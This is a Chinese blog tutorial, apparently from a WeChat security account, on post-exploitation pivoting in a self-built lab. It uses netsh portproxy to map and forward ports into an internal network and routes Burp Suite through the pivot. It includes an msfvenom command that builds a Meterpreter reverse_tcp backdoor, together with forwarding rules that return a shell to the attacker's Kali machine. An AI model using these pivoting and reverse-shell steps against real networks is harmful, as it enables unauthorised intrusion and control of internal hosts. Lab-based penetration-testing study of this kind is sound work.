> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/91bFqKp-9k4EAjY1nT0lZA)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

 |

授权转载，文章来源：“大余 xiyou” 博客

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用 Kali Linux 作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

**0x01 前言**

在渗透测试中，当我们获得了外网服务器（如 web 服务器，ftp 服务器，mali 服务器等等）的一定权限后发现这台服务器可以直接或者间接的访问内网。  

此时渗透测试进入后渗透阶段后，内网中的其他机器是不允许外网机器访问的。这时候，我们可以通过端口转发 (隧道) 或将这台外网服务器设置成为代理，使得我们自己的攻击机（kali）可以直接访问与操作内网中的其他机器。实现这一过程的手段就叫做内网转发。

在很多时候我们获取到的服务器的权限不够，无法直接登录。如果直接登录服务器中进行操作，我们需要上传工具进行很多操作，如果服务器缺少对应的环境变量或者组件，会导致渗透受阻。而且远程登录会留下比较明显的痕迹 ，因此内网转发是我们最好的选择，在本地进行操作是最方便的！！

**0x02 环境介绍**

攻击设备：kali-2020.4  

外网 IP 地址：192.168.175.145

代理服务器：windows7

外网 IP 地址：192.168.175.175

内网 IP 地址：10.10.1.5

Web 服务器：windows2003

内网 IP 地址：10.10.1.6

外网网关：192.168.175.2

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfOG1lffAex8hwZicF6DPdpRD1jyl9DNicFCjoViazMWUsmQduzC5p9jibx5TF6XYOciafvu1Krav1GsMQ/640?wx_fmt=png)

目前 Web 服务器在内网环境，kali 只能访问代理服务器并拿到了 webshell 提权成功后，由于代理服务器功能权限局限性大，本篇文章讲解在后渗透中常用的一种方法，netsh 来端口转发和端口映射使得攻击者能正常访问内网业务，还会写到配置 Burpsuite 如何对在外网分析内网的 web 业务情况！

**0x03 netsh 端口映射**

netsh 是 windows 系统自带的一个命令行工具，这个工具可以内置中端口转发功能。那么将利用 windows 自带的端口转发 netsh interface portproxy 通过这个小工具在代理服务器设置端口转发！

**1、windows7 代理服务器操作**

这里新建个端口映射，以及查看转发规则建立成功！

```
netsh interface portproxy add v4tov4 listenport=绑定的端口 connectaddress=被攻击者服务器ip connectport=被攻击者服务端口
netsh interface portproxy show all    #查看转发规则
```

‍

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfOG1lffAex8hwZicF6DPdpRLZtBJqsc09ECUdyxupMZ7Dg0tuCo86FoML6hYmia2yN2XUCIYZDubgQ/640?wx_fmt=png)

**2、netsh 成功转发**

可看到成功通过端口转发外网攻击者 kali 成功通过浏览器访问到了内网 web 服务器业务页面！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfOG1lffAex8hwZicF6DPdpRxCA0b6aKS2WJMKmA6vtBKjDaLu4puOu9rHADwKhRrhu9EvXgoG62Cw/640?wx_fmt=png)

**3、Burpsuite 配置分析 web 业务**

首先需要下载一个 FoxyProxy 火狐插件，或者是 google 的 Proxy SwitchyOmega 两个非常好用的代理插件！主要因为顺手，当然还可以在 IE、火狐上设置全局代理也可以！

这里我不过多介绍怎么简单设置代理了，我前面的文章都介绍过了，开始！很简单设置代理：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfOG1lffAex8hwZicF6DPdpRwCeyBu0PFloRJIicCd2Ef8bE8zqwylWicCx8xJTRIFgdgUMBfeibUwUhA/640?wx_fmt=png)

可看到成功在外网 kali 利用 bp 抓包分析内网业务… 很简单吧~。但是这种无法穿透防火墙拦截… 下面将介绍 netsh 如何反向操作无视防火墙！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfOG1lffAex8hwZicF6DPdpRDXhM3ph7yOZuwhCCz6Na2ibdOUlzrLzicrAiaFcmZbel4EUQXd91Im0iaw/640?wx_fmt=png)

**0x04 netsh 端口转发**

通过（三）我们获得了访问内网 web 服务器业务后，因为目前只能通过访问 web，无法通过外网电脑控制内网电脑，如何继续横向或者是在 kali 上拿到一个内网 web 服务器的 shell 权限来控制电脑呢？

接下来我演示该思路来突破在外网电脑无法连接内网电脑的情况下，通过代理服务器也能直接拿到内网电脑的 shell 权限！

**1、MSF 生成后门**

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.5 lport=6666 -f exe > dayu.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfOG1lffAex8hwZicF6DPdpRCzI8wRRoub6iaO6iajoCS7IVrvibu7ETpVicBPFb1GscODp353Oic624f8g/640?wx_fmt=png)

**2、netsh 端口转发**

将连接本地端口 6666 转发到指定端口 6666！

```
netsh interface portproxy add v4tov4 listenport=6666 connectaddress=192.168.175.145 connectport=6666
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfOG1lffAex8hwZicF6DPdpR1pS8wAxOs9XcAOKBSMgwXLCOP71FOd2eJcWByZqvNS0puX47c5GTYQ/640?wx_fmt=png)

**3、外网 kali 设置 MSF 监听**

这最基础的了，就带过了~

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfOG1lffAex8hwZicF6DPdpRHZeP6s871jicmXZLp5jTdPaXSOwiaIVv1JcqeZXDwnnj6w8NAVuFAAqA/640?wx_fmt=png)

**4、****成功拿 shell**

这里成功在外网 kali 上拿到了内网控制权限，可进行任意操作了！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfOG1lffAex8hwZicF6DPdpRe4ve0e9MYcSwuGouf7kO8qjiaf9BDgWu7c5za0ibBpXib4T1oD84M4bgg/640?wx_fmt=png)

**5、****常用命令**

针对 netsh 转发常用命令：

```
根据端口清除规则指定规则：
netsh interface portproxy delete v4tov4 listenport=7777

查看转发规则：
netsh interface portproxy show all

清除所有规则：
netsh interface portproxy reset
```

‍

**0x05 总结**

端口映射与端口转发，用于发布防火墙内部的服务器或者防火墙内部的客户端计算机，有的路由器也有端口映射与端口转发功能。端口映射与端口转发实现的功能类似，但又不完全一样。

端口映射是将外网的一个端口完全映射给内网一个地址的指定端口，而端口转发是将发往外网的一个端口的通信完全转发给内网一个地址的指定端口。端口映射可以实现外网到内网和内网到外网双向的通信，而映射转发只能实现外网到内网的单向通信！！

这只是讲解了一个简单的内网穿透思路，由于 netsh 是 windwos 自带的，所以自带免杀功能！！非常的实用！！看完的小伙伴如果会的也操作一遍吧！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。  

只需关注公众号并回复 “9527” 即可获取一套 HTB 靶场学习文档和视频，“1120” 获取安全参考等安全杂志 PDF 电子版，“1208” 获取个人常用高效爆破字典，“0221” 获取 2020 年酒仙桥文章打包，还在等什么？赶紧关注学习吧！

* * *

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xong5AN4sVjsv6p71ice1qcHHQZJIZ09xK3lQgJquhqTLfoa9qcQ7cVYw/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486401&idx=1&sn=1104aa3e7f2974e647d924dfde83e6af&chksm=cfa6afd2f8d126c47d81afd02f112daea41bce45305636e3bba9a67fbdcf6dbd0e88ff786254&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfUDrsHTbibHAhlaWGRoY4yMzOsSHefUAVibW0icEMD8jum4JprzicX3QbT6icvA6vDcyicDlBI4BTKQauA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484585&idx=1&sn=28a90949e019f9059cf9b48f4d888b2d&chksm=cfa6a0baf8d129ac29061ecee4f459fa8a13d35e68e4d799d5667b1f87dcc76f5bf1604fe5c5&scene=21#wechat_redirect)

**欢 迎 私 下 骚 扰**

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6Y0G8fqI9wh7f3J29AHLwmxjIicpxcjiaF2icmzsFu0QYcteUg93sgeWGpA/640?wx_fmt=jpeg)